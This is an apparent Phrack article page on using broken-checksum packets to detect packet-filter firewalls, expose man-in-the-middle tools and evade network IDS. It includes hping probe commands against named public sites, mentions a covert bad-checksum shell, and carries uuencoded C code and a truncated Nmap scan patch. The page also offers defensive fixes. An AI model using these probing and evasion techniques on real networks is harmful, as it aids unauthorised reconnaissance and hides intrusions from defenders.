M7VEN=#A?=&quot;DI.PT*#0HO*D)U:6QD(%1H92!3;6(@5&#039;)A;G-A8W1I;VX@4F5Q
M=65S=&quot;!(96%D97(J+PT*#0I4&lt;F%N&lt;U)E&lt;75E&lt;W0@/2`H4VUB5&#039;)A;G-297%U
M97-T2&amp;1R(&quot;H@*2`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;@@4&amp;%C:V5T(&quot;L@#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2`-&quot;B`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@*R!S:7IE;V8H4VUB0F%S94AD&lt;BDI.PT*#0HO*B!7;W)D0V]U
M;G1#;W5N=&quot;`](#$T(&quot;L@4V5T=7!#;W5N=&quot;`-&quot;B`J(&amp;)U=&quot;!3971U&lt;$-O=6YT
M(#T@,&quot;!S;R!7;W)D0V]U;G0@/3$T(&quot;HO#0H-&quot;E1R86YS4F5Q=65S=&quot;T^5V]R
M9$-O=6YT/3$T.PT*#0HO*B!087)A;65T97)#;W5N=&quot;!I&lt;R!T:&amp;4@8GET92!C
M;W5N=&quot;!O9@T*(&quot;H@=&amp;AE(&#039;!A&lt;F%M971E&lt;G,@8GET97,@9F]R(&#039;1H92!205`@
M4D5154535&quot;`@#0H@*B`H3F5T4VAA&lt;F5%;G5M(&amp;9U;F-T:6]N*2!S;R`Q.0T*
M(&quot;H@8GET97,@*B\-&quot;@T*5&#039;)A;G-297%U97-T+3Y087)A;65T97)#;W5N=%LP
M72`](#$Y.PT*#0H-&quot;B\J5V4@;F5E9&quot;!J=7-T(&amp;]N92!P86-K970@=&amp;\@&lt;V5N
M9&quot;!T:&amp;4@&lt;&amp;%R86UE=&amp;5R&lt;R`-&quot;B`J(&#039;-O(%1O=&amp;%L4&amp;%R86UE=&amp;5R0V]U;G0@
M:7,@97%U86P@=&amp;\@4&amp;%R86UE=&amp;5R(&amp;-O=6YT*B\-&quot;@T*(%1R86YS4F5Q=65S
M=&quot;T^5&amp;]T86Q087)A;65T97)#;W5N=%LP72`](#$Y.PT*#0HO*D9O&lt;B!T:&amp;4@
M;6%X(&#039;-I&gt;F4@;V8@9&amp;%T82!A;F0@&lt;&amp;%R86UE=&amp;5R&lt;R`-&quot;B`J(&#039;=E(&#039;!U=&quot;!A
M(&amp;)I9R!V86QU92HO#0H-&quot;B!4&lt;F%N&lt;U)E&lt;75E&lt;W0M/DUA&gt;%!A&lt;F%M971E&lt;D-O
M=6YT6S%=/3!X,#0[#0H@5&#039;)A;G-297%U97-T+3Y-87A$871A0V]U;G1;,5T]
M,&#039;A&amp;1CL-&quot;B!4&lt;F%N&lt;U)E&lt;75E&lt;W0M/DUA&gt;$1A=&amp;%#;W5N=%LP73TP&gt;$9&amp;.PT*
M#0HO*DYO($1A=&amp;$L(&#039;-O(%1O=&amp;%L1&amp;%T84-O=6YT(&amp;%N9&quot;!$871A0V]U;G0@
M87)E(&amp;5Q=6%L(&#039;1O(&#039;IE&lt;F\J+PT*#0H@5&#039;)A;G-297%U97-T+3Y4;W1A;$1A
M=&amp;%#;W5N=%LP73TP.PT*#0H@5&#039;)A;G-297%U97-T+3Y$871A0V]U;G1;,%T]
M,#L-&quot;@T*+RI4:&amp;4@;V9F&lt;V5T(&amp;9R;VT@=&amp;AE(&amp;9I&lt;G-T(&amp;)Y=&amp;4@;V8@=&amp;AE
M(%-M8B!&quot;87-E(`T*(&quot;H@2&amp;5A9&amp;5R(&#039;1O(&#039;1H92!P87)A;65T97(@:7,@-S8@
M8GET97,@*B\-&quot;@T*(%1R86YS4F5Q=65S=&quot;T^4&amp;%R86UE=&amp;5R3V9F&lt;V5T6S!=
M/3&lt;V.PT*#0HO*E1H97)E(&amp;ES(&amp;YO(&amp;1A=&amp;$@#0H@*B!S;R!T:&amp;4@;V9F&lt;V5T
M(&amp;ES(&amp;5Q=6%L(&#039;1O(&#039;1H92!T;W1A;&quot;!S:7IE(&quot;HO#0H-&quot;B!4&lt;F%N&lt;U)E&lt;75E
M&lt;W0M/D1A=&amp;%/9F9S971;,%T].34[#0H-&quot;B\J4V5T=7!#;W5N=&quot;!I&lt;R!E&lt;75A
M;&quot;!T;R!Z97)O*B\-&quot;@T*(%1R86YS4F5Q=65S=&quot;T^4V5T=7!#;W5N=#TP.PT*
M#0HO*D)Y=&amp;5#;W5N=&quot;`](&amp;QE;F=T:&quot;!O9B!T:&amp;4@(DYA;64B(&#039;-T&lt;FEN9R`H
M,3,@8GET97,I(&quot;`-&quot;B`J(&amp;%N9&quot;!T:&amp;4@4&amp;%R86UE=&amp;5R(&amp;9I96QD(&quot;@Q.2!B
M&gt;71E&lt;RDJ+PT*#0H@5&#039;)A;G-297%U97-T+3Y&quot;&gt;71E0V]U;G1;,%T],S([#0H-
M&quot;B\J0V]P&gt;2!T:&amp;4@;F%M92!S=&#039;)I;F&lt;@9F]R($YE=&#039;-H87)E16YU;2!F=6YC
M=&amp;EO;BHO#0H-&quot;B!M96UC&lt;&#039;DH*&#039;5?8VAA&lt;B`J*2`H4&amp;%C:V5T(&quot;L@#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I(&quot;L-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB0F%S94AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)4&lt;F%N&lt;U)E&lt;75E&lt;W1(9&#039;(I*2P-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!.04U%7U)!4%]#3TU-04Y$+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.04U%7U)!4%]#3TU-04Y$*2TQ*3L-&quot;@T*(%!A8VME
M=$QE;F=T:&quot;`]&quot;7-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@&lt;VEZ96]F*%-M8E1R86YS4F5Q=65S=$AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&#039;-I&gt;F5O9BA.04U%7U)!4%]#3TU-04Y$*2`M,2`K(`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*3L-&quot;B`-&quot;B!W&lt;FET92A3;V-K
M+%!A8VME=&quot;Q086-K971,96YG=&amp;@I.PT*#0H@9G)E92A086-K970I.PT*?0T*
M#0HO*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(%1(12!-04E.($953D-424].#0HJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHO#0H-&quot;F5X=&amp;5R;B!C:&amp;%R(&quot;IO&lt;&#039;1A&lt;F&lt;[#0IE&gt;&#039;1E&lt;FX@:6YT
M(&amp;]P=&amp;EN9#L-&quot;F5X=&amp;5R;B!I;G0@;W!T97)R.PT*#0II;G0@;6%I;BAI;G0@
M87)G8RP@8VAA&lt;B`J87)G=EM=*0T*&gt;PT*(&#039;-T871I8R!C:&amp;%R(&amp;]P=&#039;-T&lt;FEN
M9UM=(#T@(F,Z&lt;SHB.PT*(&amp;EN=&quot;!O&lt;&#039;1C:#L-&quot;@T*+RI4:&amp;4@&lt;V]C:V5T+&quot;!T
M;R!I;FIE8W0@&lt;&amp;%C:V5T&lt;RHO#0H@#0H@:6YT(%-O8VL[#0H-&quot;B\J5&amp;AE(&#039;-T
M&lt;FEN9R!F;W(@=&amp;AE(%--0B!D;VUA:6X@;F%M92HO(`T*(`T*(&amp;-H87(@*D1O
M;6%I;DYA;64[#0H@#0HO*E1H92!,96YG=&amp;@@;V8@=&amp;AE(&quot;)$;VUA:6Y.86UE
M(B!S=&#039;)I;F&lt;J+PT*(`T*(&amp;EN=&quot;!$;VUA:6Y.86UE3&amp;5N9W1H.PT*#0HO*E1H
M92!4240@;G5M8F5R(&amp;9O&lt;B!T:&amp;4@5$-/3E@@86YD(%1204Y304-424].(&#039;!A
M8VME=&#039;,J+PT*(`T*(&#039;5?:6YT.%]T(&quot;I4:60[#0H-&quot;B\J5&amp;AE(&quot;)N;W)M86PB
M(&amp;-L:65N=&quot;!.151&quot;24]3(&amp;YA;64J+PT*(`T*(&amp;-H87(@0VQI96YT6S$V73L-
M&quot;@T*+RI4:&amp;4@&lt;V5R=F5R)W,@25`@861R97-S*B\@#0H@#0H@8VAA&lt;B!397)V
M97);,39=.PT*#0H@8VAA&lt;B!086-K971;-#`Y-ET[#0H-&quot;B!S=&#039;)U8W0@&lt;V]C
M:V%D9&#039;)?:6X@4VUB4V5R=F5R.PT*(`T*#0H@:68H87)G8R`\(#4I#0H@&gt;PT*
M(&quot;!P&lt;FEN=&amp;8H(EQN(%-C86Y3:&amp;%R92`M8R!C;&amp;EE;G0G&lt;R!N86UE(&quot;US(&#039;-E
M&lt;G9E&lt;B=S($E0(&amp;%D&lt;F5S&lt;UQN(BD[#0H@(&#039;)E=&#039;5R;B`P.PT*(&#039;T-&quot;B`-&quot;B!W
M:&amp;EL92@H;W!T8V@](&amp;=E=&amp;]P=&quot;AA&lt;F=C+&amp;%R9W8L;W!T&lt;W1R:6YG*2DA/45/
M1BD-&quot;B![#0H@(&#039;-W:71C:&quot;AO&lt;&#039;1C:&quot;D-&quot;B`@&gt;PT*(&quot;`@8V%S92`G8R&lt;Z#0H@
M(&quot;`@+RH@5&amp;AE($Y%5$))3U,@;F%M92!I&lt;R`Q-B!L;VYG+`T*(&quot;`@(&quot;`J(&#039;1H
M92`Q-2!F:7)S=&quot;!C:&amp;%R86-T97)S(&amp;%R92!F;W(@=&amp;AE(&amp;YA;64J+PT*#0H@
M(&quot;`@;65M&lt;V5T*$-L:65N=&quot;PP+#$V*3L-&quot;B`@(&quot;!S=&#039;)N8W!Y*$-L:65N=&quot;QO
M&lt;&#039;1A&lt;F&lt;L&lt;W1R;&amp;5N*&amp;]P=&amp;%R9RDI.PT*(&quot;`@(`T*(&quot;`@(&quot;\J(%1H92!L87-T
M(&amp;-H87)A8W1E&lt;B!G:79E&lt;R!T:&amp;4@=&#039;EP92!O9@T*(&quot;`@(&quot;`J(&amp;-O;7!U=&amp;5R
M+&quot;!I;B!T:&amp;ES(&amp;-A&lt;V4@+&quot;`P&gt;#`P(&#039;)E&lt;&#039;)E&lt;V5N=&#039;,-&quot;B`@(&quot;`@*B!A(&#039;=O
M&lt;FMS=&amp;%T:6]N*B\-&quot;B`@(&quot;`-&quot;B`@(&quot;!#;&amp;EE;G1;,35=/3!X,#`[#0H@(&quot;`@
M8G)E86L[#0H-&quot;B`@(&amp;-A&lt;V4@)W,G.@T*(&quot;`@(&quot;\J5&amp;AE(&#039;-A;64@9F]R(&#039;1H
M92!S97)V97(J+PT*(&quot;`@(`T*(&quot;`@(&amp;UE;7-E=&quot;A397)V97(L,&quot;PQ-BIS:7IE
M;V8H8VAA&lt;BDI.PT*(&quot;`@(&#039;-T&lt;FYC&lt;&#039;DH4V5R=F5R+&amp;]P=&amp;%R9RQS=&#039;)L96XH
M;W!T87)G*2D[#0H@(&quot;`@#0H@(&quot;`@+RHP&gt;#(P(&#039;)E&lt;&#039;)E&lt;V5N=&#039;,@82!334(@
M&lt;V5R=F5R*B\-&quot;B`@(&quot;`-&quot;B`@(&quot;!397)V97);,35=/3!X,C`[#0H@(&quot;`@8G)E
M86L[#0H-&quot;B`@(&amp;1E9F%U;&#039;0@.@T*(&quot;`@(&#039;!R:6YT9B@B7&amp;X@4V-A;E-H87)E
M(&quot;UC(&amp;-L:65N=&quot;=S(&amp;YA;64@+7,@&lt;V5R=F5R)W,@25`@861R97-S7&amp;XB*3L-
M&quot;B`@(&quot;!R971U&lt;FX@,#L-&quot;B`@(&#039;T-&quot;B`@?0T*#0H@#0H-&quot;@T*(%1I9&quot;`](&quot;AU
M7VEN=#A?=&quot;`J*2`H;6%L;&amp;]C*#(@*B!S:7IE;V8H=5]I;G0X7W0I*2D[#0H-
M&quot;B!3;V-K/7-O8VME=&quot;A!1E])3D54+%-/0TM?4U1214%-+#`I.PT*#0HO*D-R
M96%T92!O=7(@&lt;V]C:V5T*B\@#0H@#0H@4VUB4V5R=F5R+G-I;E]F86UI;&#039;D]
M($%&amp;7TE.150[#0H@#0HO*D-O;FYE8W1I;VX@=&amp;\@=&amp;AE(&#039;!O&lt;G0@,3,Y*B\-
M&quot;B`-&quot;B!3;6)397)V97(N&lt;VEN7W!O&lt;G0@/2!H=&amp;]N&lt;RA334)?4$]25&quot;D[(`T*
M(&amp;EN971?871O;BA397)V97(L)E-M8E-E&lt;G9E&lt;BYS:6Y?861D&lt;BD[#0H-&quot;B!C
M;VYN96-T*`T*(&quot;`@(&quot;`@(&quot;`@4V]C:RP-&quot;B`@(&quot;`@(&quot;`@(&quot;AS=&#039;)U8W0@&lt;V]C
M:V%D9&#039;(J(&quot;D@*&quot;93;6)397)V97(I+`T*(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*&#039;-T&lt;G5C
M=&quot;!S;V-K861D&lt;E]I;BDI.PT*#0HO*B!4:&amp;ES(&amp;9U;F-T:6]N(&#039;-E;F1S(&amp;$@
M3D540DE/4R!297%U97-T(&#039;!A8VME=&quot;!W:71H(`T*(&quot;H@=&amp;AE(&amp;5N8V]D960@
M3D540DE/4R!N86UE&lt;R`J+PT*#0H@4V5N9$YE=$)I;W-.86UE4F5Q=65S=&quot;A3
M;V-K+$-L:65N=&quot;Q397)V97(I.PT*#0HO*E=A:71I;F&lt;@9F]R(&#039;1H92!R97-P
M;VYS92HO#0H@#0H@&lt;F5A9&quot;A3;V-K+%!A8VME=&quot;PT,#DV*3L-&quot;@T*+RH@5&amp;AI
M&lt;R!F=6YC=&amp;EO;B!S96YD&lt;R!T:&amp;4@3F5G4&#039;)O=&quot;!297%U97-T(&#039;!A8VME=&quot;HO
M#0H@#0H@4V5N9$YE9U!R;W1297%U97-T*%-O8VLI.PT*#0HO*B!792!R96-E
M:79E(&#039;1H92!R97-P;VYS92!A;F0@=V4@86YA;&#039;ES92!I=`T*(&quot;H@=&amp;\@:&amp;%V
M92!T:&amp;4@4TU&quot;(&amp;1O;6%I;B!N86UE*B\-&quot;B`-&quot;B!$;VUA:6Y.86UE(#T@4F5C
M96EV94YE9U!R;W1297!L&gt;2A3;V-K+&quot;`F1&amp;]M86EN3F%M94QE;F=T:&quot;D[#0H-
M&quot;B\J(%1H:7,@9G5N8W1I;VX@&lt;V5N9&#039;,@=&amp;AE(%-E=&#039;5P6&quot;!R97%U97-T(&#039;!A
M8VME=&quot;HO#0H@#0H@4V5N9%-E=&#039;5P6%)E&lt;75E&lt;W0H4V]C:RQ$;VUA:6Y.86UE
M3&amp;5N9W1H+$1O;6%I;DYA;64I.R`-&quot;@T*+RH@=V4@&lt;F5C96EV92!T:&amp;4@&lt;F5S
M&lt;&amp;]N&lt;V4J+PT*(`T*(&#039;)E860H4V]C:RQ086-K970L-#`Y-BD[#0H-&quot;B\J5&amp;AI
M&lt;R!F=6YC=&amp;EO;B!S96YD&lt;R!T:&amp;4@5&amp;-O;G@@&lt;F5Q=65S=&quot;!P86-K970J+PT*
M(`T*(%-E;F148V]N6%)E&lt;75E&lt;W0H4V]C:RQ397)V97(I.PT*#0HO*B!792!R
M96-E:79E(&#039;1H92!R97-P;VYS92!A;F0@=V4@86YA;&#039;ES92!I=&quot;`-&quot;B`J(&#039;1O
M(&amp;AA=F4@=&amp;AE(%1)1&quot;!N=6UB97(J+PT*(`T*(%)E8V5I=F548V]N6%)E&lt;&amp;QY
M*%-O8VLL5&amp;ED*3L-&quot;B`-&quot;B\J(%1H:7,@9G5N8W1I;VX@&lt;V5N9&#039;,@=&amp;AE(%1R
M86YS86-T:6]N(&#039;)E&lt;75E&lt;W0@&lt;&amp;%C:V5T#0H@*B!W:71H(%)!4&quot;!C;VUM86YD
M($YE=%-H87)E16YU;2HO#0H@#0H@4V5N9%1R86YS4F5Q=65S=&quot;A3;V-K+%1I
M9&quot;D[#0H-&quot;B\J5V4@86YA;&#039;ES92!T:&amp;4@&lt;F5S&lt;&amp;]N&lt;V4J+PT*(`T*(%)E8V5I
I=F54&lt;F%N&lt;U)E&lt;&amp;QY*%-O8VLI.PT*(`T*(&#039;)E=&#039;5R;B`P.PT*?0T*#0H`
`
end

|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x0c of 0x10

|=----=[ Firewall spotting and networks analisys with a broken CRC ]=----=|
|=-----------------------------------------------------------------------=|
|=-----------------------------=[ Ed3f ]=--------------------------------=|


--[ Contents

  0 - School

  1 - Something In The Way

  2 - Come As You Are

  3 - You Know You&#039;re Right

  4 - Drain You

  5 - Big Long Now


--[ 0 - School

    Packet filters firewall are going to be deployed more and more for the
sense of security the word &quot;firewall&quot; has got on not-technical people.
Available as commercial software, embedded device or inside opensource OS
they work at level 3. The support for level 4 isn&#039;t complete: they filter
ports numbers, TCP flags, seq numbers, defragmentation, but ...

What about level 4 checksum?

Are they checking for TCP checksum before analyze flags or port numbers?
No.

    Most developers say there would be too overhead and other think that
the packet will be simply dropped by destination OS stack. All correct, but
how could we take advantage of this &quot;feature&quot;?

1) firewalls reply spotting
2) damn 31337 MiM spotting
3) insert invalid packets inside a network


--[ 1 - Something In The Way

    A complete network stack will drop invalid packets without response. No
matter if that port is closed, open or whatever... But Packet Filters
aren&#039;t so smart and they will reply.

    If we want to determine if there is a packet filter between us and a
target host we must first check if the packet filter is configured to drop
the packets or to send back an error. For this we send a valid tcp packet
to any port that is supposed to be filtered:

# telnet www.oracle.com 31337
Trying 148.87.9.44...
telnet: Unable to connect to remote host: Connection refused

    Good. Either the target host itself or a packet filter sends back a
RST. Next step is to check if the RST comes from the target host or from
a packet filter:

# hping -S -c 1 -p 31337 -b www.oracle.com
HPING www.oracle.com (rl0 148.87.9.44): S set, 40 headers + 0 data bytes
len=46 ip=148.87.9.44 flags=RA seq=0 ttl=23 id=52897 win=512 rtt=459.8 ms

    If we get a reply we know that a packet filter is in place. If we
dont get a reply we suspect that the packet arrives unfiltered at the
destination host and is dropped by the TCP stack (e.g. no packet filter is
in place).

    Another technique to detect the existence of a packet filter is to
compare the TTL of a RST and a SYN (which comes directly from the target
host). The TTL-technique fails for all packet filters in bridging mode
or filters that do not decrease the TTL and are placed directly in front
of the target host (normal DMZ setup). The CRC-technique as described
above on the other hand detects a packet filtering device in both cases.


Other example, UDP this time:

# hping -2 -c 1 -p 53 -b www.redhat.com
HPING www.redhat.com (rl0 66.187.232.56): udp mode set, 28 headers + 0 data
ICMP Packet filtered from ip=63.146.1.74 name=UNKNOWN

    Having a way to distinguish packets from the host and the firewall,
let us use OS identification tools working only with firewall packets
without mixing host and firewall replys. Try nmap -O.

Interesting ?
Well I made a quick patch for Nmap-3.1ALPHA4 that add 2 new type of scan:
 -sZ BadTCP SYN stealth port scan
 -sV BadUDP port scan
  
    Note that -sZ is derived by a bad drawn -sS and -sV by -sU. BadTCP scan
uses FIN scan engine because the default behavior of a host is not to reply.
BadUDP scan uses UDP scan engine because the default behavior of a host is
not to reply.

    I hope that Fyodor will think about a from scratch version of Nmap for
version 4.00 that could permit to define the real and complete situation of
host ports:

- closed
- opened
- filtered (no reply)
- firewalled (firewall reply)

The patch is below.

    How does Scanlogd work against this new type scans? Uhm, it still
thinks that they are valid packets and it doesn&#039;t give the configuration
options to alert for valid or invalid SYN packets.


--[ 2 - Come As You Are

    Ok, so packet filters, even the beautiful OpenBSD 3.2 PF, will have to
calculate the checksum for every packet?  No, to avoid reply spotting they
could check the checksum only for packets they want to reply. However it should
be introduced an option to spot broken checksum packets and drop them.

    Some tools that let you alter packets and permit MiM exist, like
ettercap, and let your host send packets to the right box and after
logging/altering forward them to the real destination.

How could we spot the banner trick ?
# echo &quot;SSH-1.99&quot; &gt; /tmp/banner
# hping -S -c 1 -p 22 -E /tmp/banner -d 9 -b mybox 
If you receive a SYN+ACK you can start swearing...

    Note that depends on how the MiM attack is developed. For example
DSniff check TCP checksum because it works in proxed mode, while
ettercap, that uses a non-proxed method, doesn&#039;t. Generally if you don&#039;t
add such a sanity check in your tool you could be discovered.

    Is this check always needed? No, it&#039;s needed if you want to alter a
packet or you want to reply to a received packet. So if your tool simply
sniff packets without sending/modifying them you&#039;re safe.

    Ok, but if I want to safely reply-to/modify packets what is the
solution? You have 2 solutions:

1) check the checksum for every packet and work only if correct without
   dropping it in any case; modify/reply-to using a valid checksum.
2) using Incremental Updating of the Internet Checksum [RFC1141] for
   packets that needs to be modified; checking the checksum for packets you
   want to reply 

    Note that incremental updating will keep a checksum broken if it was
broken and correct if it was correct and it&#039;s really faster than
calculating it from scratch.

    Curiosity: TCP checksum of a source route packets is invalid while it&#039;s
in flight, because it is based on the final destination IP address, which is
altered as the source route is followed (at the destination, it will be
correct).

    Most default IDS configurations will alert about bad checksumming traffic
but never log those packets, so the admin couldn&#039;t check the data part and what
was going on. Generally it&#039;s possible to create a covert shell with a bad cksum
tunnel on a r00t compromised box and connect to it without being detected.

    Another type of problem could born if the code of a NAT-box/load balancer
calculate che checksum from scratch. In this case we could bypass an IDS if
it&#039;s placed between our box and this dumb device.
Check this interesting example:
                
www.oracle.com:80
                        
Evil --[badSYN]--&gt; Router --[badSYN]--&gt; Load_Balancer --[SYN]--&gt; WebServer 
				|			  |
			      NIDS1			NIDS2

NIDS1 will see a TCP SYN with invalid checksum while NIDS2, if deployed, will
see a valid and modifyed SYN. So the webserver will reply to us with a SYN+ACK,
letting us talk with it while causing a lot of doubts to NIDS1.
What would you think if you were the security manager and you&#039;ll find such
different results on NIDS1 and NIDS2 ?

    The solution is always Incremental Updating [RFC1141].


--[ 3 - You Know You&#039;re Right

awgn (31337 H4X0R)
raptor &amp; nobody (LSD project)
batmaNAGA &amp; ALORobin (ettercap authors)
JWK (OpenBSD addicted)
Daniel Hartmeier (Mr.Infinite Patience; OpenBSD PF main coder) 
antirez (Hping author)
Fyodor (Nmap author)
Ed3f (15b27bed5e11fc0550d7923176dbaf81)


--[ 4 - Drain You

[1] Hping	---&gt;	http://www.hping.org
[2] Nmap	---&gt;	http://www.insecure.org/nmap
[3] Scanlogd	---&gt;	http://www.openwall.com/scanlogd                        
[4] OpenBSD	---&gt;	http://www.openbsd.org
[5] OpenBSD PF	---&gt;	http://www.benzedrine.cx/pf.html
[6] Ettercap    ---&gt;	http://ettercap.sourceforge.net
[7] DSniff      ---&gt;	http://monkey.org/~dugsong/dsniff                       
[8] RFC1141     ---&gt;	http://www.ietf.org/rfc/rfc1141.txt


--[ 5 - Big Long Now

begin 600 nmap-fw-detection-patch.diff
M9&amp;EF9B`M=7).8B!N;6%P+3,N,3!!3%!(030O3FUA&lt;$]P&lt;RYC8R!N;6%P+3,N
M,3!!3%!(030M8F%D+TYM87!/&lt;&#039;,N8V,*+2TM(&amp;YM87`M,RXQ,$%,4$A!-&quot;].
M;6%P3W!S+F-C&quot;5=E9&quot;!/8W0@,C,@,#@Z-3$Z-3&lt;@,C`P,@HK*RL@;FUA&lt;&quot;TS
M+C$P04Q02$$T+6)A9&quot;].;6%P3W!S+F-C&quot;51H=2!$96,@,3(@,#&lt;Z-3@Z,C0@
M,C`P,@I`0&quot;`M,30X+#8@*S$T.&quot;PW($!`&quot;B`@(&amp;QI&lt;W1S8V%N(#T@&lt;&amp;EN9W-C
M86X@/2!A;&amp;QO=V%L;&quot;`](&amp;%C:W-C86X@/2!B;W5N8V5S8V%N(#T@8V]N;F5C
M=&#039;-C86X@/2`P.PH@(&quot;!R&lt;&amp;-S8V%N(#T@;G5L;&#039;-C86X@/2!X;6%S&lt;V-A;B`]
M(&amp;9R86=S8V%N(#T@&lt;WEN&lt;V-A;B`](&#039;=I;F1O=W-C86X@/2`P.PH@(&quot;!M86EM
M;VYS8V%N(#T@:61L97-C86X@/2!F:6YS8V%N(#T@=61P&lt;V-A;B`](&amp;EP&lt;&#039;)O
M=&#039;-C86X@/2!N;W)E&lt;V]L=F4@/2`P.PHK(&quot;!B861T8W!S8V%N(#T@8F%D=61P
M&lt;V-A;B`](&amp;)A9&amp;-K&lt;W5M(#T@,#L*(&quot;`@9F]R8V4@/2!A&lt;&#039;!E;F1?;W5T&lt;&#039;5T
M(#T@,#L*(&quot;`@8GIE&lt;F\H;&amp;]G9F0L(&#039;-I&gt;F5O9BA&amp;24Q%(&quot;HI(&quot;H@3$]&#039;7U19
M4$53*3L*(&quot;`@;FUA&lt;%]S=&amp;1O=70@/2!S=&amp;1O=70[&quot;D!`(&quot;TQ-38L,3$@*S$U
M-RPQ,2!`0`H@?0H@&quot;B!B;V]L($YM87!/&lt;&#039;,Z.E1#4%-C86XH*2![&quot;BT@(&#039;)E
M=&#039;5R;B!A8VMS8V%N?&amp;)O=6YC97-C86Y\8V]N;F5C=&#039;-C86Y\9FEN&lt;V-A;GQI
M9&amp;QE&lt;V-A;GQM86EM;VYS8V%N?&amp;YU;&amp;QS8V%N?&#039;-Y;G-C86Y\=VEN9&amp;]W&lt;V-A
M;GQX;6%S&lt;V-A;CL**R`@&lt;F5T=7)N(&amp;%C:W-C86Y\8F]U;F-E&lt;V-A;GQC;VYN
M96-T&lt;V-A;GQF:6YS8V%N?&amp;ED;&amp;5S8V%N?&amp;UA:6UO;G-C86Y\;G5L;&#039;-C86Y\
M&lt;WEN&lt;V-A;GQW:6YD;W=S8V%N?&#039;AM87-S8V%N?&amp;)A9&#039;1C&lt;&#039;-C86X[&quot;B!]&quot;B`*
M(&amp;)O;VP@3FUA&lt;$]P&lt;SHZ54104V-A;B@I(&#039;L*+2`@&lt;F5T=7)N(&#039;5D&lt;&#039;-C86X[
M&quot;BL@(&#039;)E=&#039;5R;B!U9&#039;!S8V%N?&amp;)A9&#039;5D&lt;&#039;-C86X[&quot;B!]&quot;B`*(`I`0&quot;`M,C$X
M+#&lt;@*S(Q.2PW($!`&quot;B`@(&quot;`@?0H@(V5N9&amp;EF&quot;B`@(&quot;`@&quot;BT@(&quot;`@:68@*&amp;%C
M:W-C86Y\9FEN&lt;V-A;GQI9&amp;QE&lt;V-A;GQI&lt;&#039;!R;W1S8V%N?&amp;UA:6UO;G-C86Y\
M;G5L;&#039;-C86Y\&lt;WEN&lt;V-A;GQU9&#039;!S8V%N?&#039;=I;F1O=W-C86Y\&gt;&amp;UA&lt;W-C86XI
M(&#039;L**R`@(&quot;!I9B`H86-K&lt;V-A;GQF:6YS8V%N?&amp;ED;&amp;5S8V%N?&amp;EP&lt;&#039;)O=&#039;-C
M86Y\;6%I;6]N&lt;V-A;GQN=6QL&lt;V-A;GQS&gt;6YS8V%N?&#039;5D&lt;&#039;-C86Y\8F%D=61P
M&lt;V-A;GQW:6YD;W=S8V%N?&#039;AM87-S8V%N?&amp;)A9&#039;1C&lt;&#039;-C86XI(&#039;L*(&quot;-I9FYD
M968@5TE.,S(*(&quot;`@(&quot;`@(&amp;9A=&amp;%L*&quot;)9;W4@&lt;F5Q=65S=&amp;5D(&amp;$@&lt;V-A;B!T
M&gt;7!E(&#039;=H:6-H(&#039;)E&lt;75I&lt;F5S(&#039;(P,&#039;0@&lt;&#039;)I=FEL96=E&lt;RP@86YD(&#039;EO=2!D
M;R!N;W0@:&amp;%V92!T:&amp;5M+EQN(BD[&quot;B`C96QS90I`0&quot;`M,C4Y+#$U(&quot;LR-C`L
M,34@0$`*(&quot;`@:68@*&amp;)O=6YC97-C86X@)B8@&lt;&amp;EN9W1Y&lt;&amp;4@(3T@4$E.1U19
M4$5?3D].12D@&quot;B`@(&quot;`@;&amp;]G7W=R:71E*$Q/1U]35$1/550L(&quot;)(:6YT.B!I
M9B!Y;W5R(&amp;)O=6YC92!S8V%N(&#039;1A&lt;F=E=&quot;!H;W-T&lt;R!A&lt;F5N)W0@&lt;F5A8VAA
M8FQE(&amp;9R;VT@:&amp;5R92P@&lt;F5M96UB97(@=&amp;\@=7-E(&quot;U0,&quot;!S;R!W92!D;VXG
M=&quot;!T&lt;GD@86YD(&#039;!I;F&lt;@=&amp;AE;2!P&lt;FEO&lt;B!T;R!T:&amp;4@&lt;V-A;EQN(BD[&quot;B`@
M(`HM(&quot;!I9B`H86-K&lt;V-A;BMB;W5N8V5S8V%N*V-O;FYE8W1S8V%N*V9I;G-C
M86XK:61L97-C86XK;6%I;6]N&lt;V-A;BMN=6QL&lt;V-A;BMS&gt;6YS8V%N*W=I;F1O
M=W-C86XK&gt;&amp;UA&lt;W-C86X@/B`Q*0HM(&quot;`@(&amp;9A=&amp;%L*&quot;)9;W4@&lt;W!E8VEF:65D
M(&amp;UO&lt;F4@=&amp;AA;B!O;F4@=&#039;EP92!O9B!40U`@&lt;V-A;BX@(%!L96%S92!C:&amp;]O
